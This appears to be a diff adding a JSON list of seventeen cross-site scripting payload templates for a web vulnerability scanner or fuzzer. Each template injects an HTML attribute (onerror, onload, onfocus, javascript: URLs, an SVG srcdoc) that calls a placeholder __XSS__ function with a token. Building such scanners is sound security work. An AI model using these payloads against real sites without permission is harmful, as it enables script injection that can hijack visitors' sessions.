@@ -1,0 +1,19 @@
+[
+  "x onerror=__XSS__('{{TOKEN}}')",
+  "x onload=__XSS__('{{TOKEN}}')",
+  "x autofocus onfocus=__XSS__('{{TOKEN}}')",
+  "x onanimationstart=__XSS__('{{TOKEN}}') style=animation-name:x",
+  "x onpointerenter=__XSS__('{{TOKEN}}')",
+  " onerror=__XSS__('{{TOKEN}}') x=",
+  " onload=__XSS__('{{TOKEN}}') x=",
+  " onclick=__XSS__('{{TOKEN}}') x=",
+  " autofocus onfocus=__XSS__('{{TOKEN}}') x=",
+  " style=background:url('javascript:__XSS__('{{TOKEN}}')') x=",
+  " accesskey=x onclick=__XSS__('{{TOKEN}}') x=",
+  "/onerror=__XSS__('{{TOKEN}}')/x=",
+  "`onmouseover=__XSS__('{{TOKEN}}')`x=",
+  " formaction=javascript:__XSS__('{{TOKEN}}') x=",
+  " srcdoc=<svg/onload=parent.__XSS__('{{TOKEN}}')> x=",
+  " onanimationstart=__XSS__('{{TOKEN}}') style=animation-name:x x=",
+  " onpointerenter=__XSS__('{{TOKEN}}') x="
+]
